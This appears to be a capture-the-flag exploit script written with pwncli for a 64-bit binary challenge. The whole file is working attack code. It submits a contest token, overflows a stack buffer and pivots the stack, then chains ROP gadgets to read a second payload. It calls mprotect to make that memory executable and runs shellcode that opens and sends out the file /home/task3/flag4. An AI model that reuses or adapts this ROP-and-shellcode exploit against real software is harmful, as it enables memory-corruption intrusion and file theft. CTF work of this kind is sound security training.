#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from pwncli import *
cli_script()
#  set_remote_libc('libc.so.6')

io: tube = gift.io
elf: ELF = gift.elf

i2b = lambda c : str(c).encode()
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
debugB = lambda : input("\033[1m\033[33m[ATTACH ME]\033[0m")

ru(b"token")
sl(b"17:MEUCIFtZ0Xqk5CauMwvYNQClJbNoG1bSMwpNLmbZCcAslJ+yAiEA9vQFGEWs9V0MpLGAWEbmgtJFRkpgzBH03sDXe6gys/g=")
ru(b"Challenge")
ru(b":")
sl(i2b(3))

syscall_ret = 0x0000000000425e04
pop_rdi_ret = 0x00000000004018c2
pop_rsi_ret = 0x0000000000402828
pop_rdx_ret = 0x00000000004017cf
pop_rax_ret = 0x00000000004583c7
str_flag    = next(elf.search(b"/home/task3/flag4\x00"))
lg("str_flag")
buf_addr    = 0x4df000+0x800

ru(b'Give me your data: \n')
payload = b"a"*(0x20+8+0x10 - 8)
payload += p64(buf_addr)

payload += p64(pop_rdx_ret) + p64(0xdeadbeef)
payload += p64(pop_rsi_ret) + p64(buf_addr-0x30)
payload += p64(pop_rdi_ret) + p64(0)
payload += p64(0x401e28)

s(payload)

import time
time.sleep(1)

shellcode_addr = 0x4df000 + 0x800 + 0x500
payload = b"a"*0x30 + p64(buf_addr-0x30)
payload += p64(pop_rdx_ret) + p64(7)
payload += p64(pop_rsi_ret) + p64(0x1000)
payload += p64(pop_rdi_ret) + p64(buf_addr & 0xffffffff000)
payload += p64(elf.sym["mprotect"])
payload += p64(shellcode_addr)
payload = payload.ljust((shellcode_addr-(buf_addr-0x30)), b"\x00")
payload += asm(r"""
    /* push b'/home/task3/flag4\x00' */
    push 0x34
    mov rax, 0x67616c662f336b73
    push rax
    mov rax, 0x61742f656d6f682f
    push rax
    /* call open('rsp', 'O_RDONLY', 'rdx') */
    push SYS_open /* 2 */
    pop rax
    mov rdi, rsp
    xor esi, esi /* O_RDONLY */
    syscall
    /* call sendfile(1, 'rax', 0, 0x7fffffff) */
    mov r10d, 0x7fffffff
    mov rsi, rax
    push SYS_sendfile /* 0x28 */
    pop rax
    push 1
    pop rdi
    cdq /* rdx=0 */
    syscall
""")
s(payload)

ia()
